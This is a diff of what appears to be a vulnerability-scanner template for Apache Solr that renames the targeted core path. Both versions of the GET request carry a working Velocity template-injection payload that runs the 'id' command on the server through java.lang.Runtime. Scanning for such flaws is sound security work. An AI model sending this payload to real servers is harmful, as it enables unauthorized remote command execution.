@@ -7,7 +7,7 @@ requests:
   - method: POST
     redirect: true
     url: >-
-     {{.BaseURL}}/solr/test/config
+     {{.BaseURL}}/solr/atom/config
     headers:
       - Content-Type: application/json
     body: >-
@@ -23,7 +23,7 @@ requests:
       }
   - method: GET
     url: >-
-     {{.BaseURL}}/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+     {{.BaseURL}}/solr/atom/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
     headers:
       - Content-Type: application/json
     detections:
